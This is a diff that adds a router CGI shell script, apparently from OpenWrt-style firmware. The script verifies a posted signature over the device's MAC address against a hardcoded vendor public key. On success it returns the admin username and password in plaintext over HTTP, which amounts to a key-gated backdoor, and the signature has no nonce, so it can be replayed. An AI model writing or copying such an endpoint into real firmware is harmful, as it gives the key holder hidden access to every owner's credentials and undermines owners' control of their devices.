@@ -1,0 +1,68 @@
+#! /bin/sh
+
+set -e
+errcode=403
+
+function return403()
+{
+        cat <<- EOF
+		Status: 403 Forbidden
+		Content-type: text/html
+
+		<h1>403 Forbidden</h1>
+	EOF
+}
+
+function return200()
+{
+        cat <<- EOF
+		Status: 200 OK
+		Content-type: text/html
+
+		$(uci get system.@system[0].admin)
+		$(uci get system.@system[0].passwd)
+	EOF
+}
+
+function write_public_key()
+{
+	cat <<- EOF
+		untrusted comment: public key a27b557e0eaaa926
+		RWSie1V+DqqpJnfdDJPPZLPru3c58q4s7Hr1CA18P+b7OUaW67zqmPBT
+	EOF
+}
+
+function rm_tmp_files()
+{
+	rm -fr "$SIGNATURE" "$MSG_FILE" "$PUBLICKEY"
+
+	if [ $errcode = "200" ]; then
+		return200
+	else
+		return403
+	fi
+}
+
+trap rm_tmp_files EXIT
+
+DeviceRole=$(uci get wificfg.2G.DeviceRole)
+if [ "$DeviceRole" = "1" ]; then
+	exit
+fi
+
+# store post data
+SIGNATURE=$(mktemp)
+cat | head -c 4096 > "$SIGNATURE"
+
+# get lan mac
+MSG_FILE=$(mktemp)
+ifconfig br-lan | grep HWaddr | awk '{print $5}' | head -c 17 | tr "A-Z" "a-z" > "$MSG_FILE"
+
+# public key
+PUBLICKEY=$(mktemp)
+write_public_key > "$PUBLICKEY"
+
+# verify
+usign -V -p "$PUBLICKEY" -m "$MSG_FILE" -x "$SIGNATURE"
+
+errcode=200
